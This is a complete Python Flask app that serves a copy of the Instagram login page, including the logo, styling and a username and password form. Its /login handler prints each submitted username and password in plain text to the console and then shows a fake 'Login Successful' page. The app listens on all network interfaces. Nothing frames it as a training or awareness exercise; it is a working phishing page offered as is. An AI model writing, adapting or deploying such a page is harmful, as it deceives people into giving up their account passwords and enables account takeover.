from flask import Flask, request, render_template_string, redirect, url_for

app = Flask(__name__)

html = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-container {
      background-color: #fff;
      border: 1px solid #dbdbdb;
      padding: 40px;
      width: 350px;
      text-align: center;
    }
    .login-container img {
      width: 175px;
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background-color: #fafafa;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #3897f0;
      color: white;
      border: none;
      border-radius: 4px;
      font-weight: bold;
      cursor: pointer;
    }
    .signup {
      margin-top: 20px;
      font-size: 14px;
    }
    .signup a {
      text-decoration: none;
      color: #3897f0;
      font-weight: bold;
    }
  </style>
</head>
<body>

<div class="login-container">
  <img src="https://1000logos.net/wp-content/uploads/2017/02/Instagram-Logo.png" alt="Instagram Logo">
  
  <form method="POST" action="/login">
    <input type="text" name="username" placeholder="Phone number, username, or email" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Log In</button>
  </form>

  <div class="signup">
    Don’t have an account? <a href="#">Sign up</a>
  </div>
</div>

</body>
</html>
"""

success_page = """
<!DOCTYPE html>
<html>
<head>
  <title>Success</title>
</head>
<body style="font-family:Arial; text-align:center; margin-top:100px;">
  <h2>✅ Login Successful</h2>
</body>
</html>
"""

@app.route('/', methods=['GET'])
def index():
    return render_template_string(html)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    print(f"🔐 Login received:\nUsername: {username}\nPassword: {password}")
    return render_template_string(success_page)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
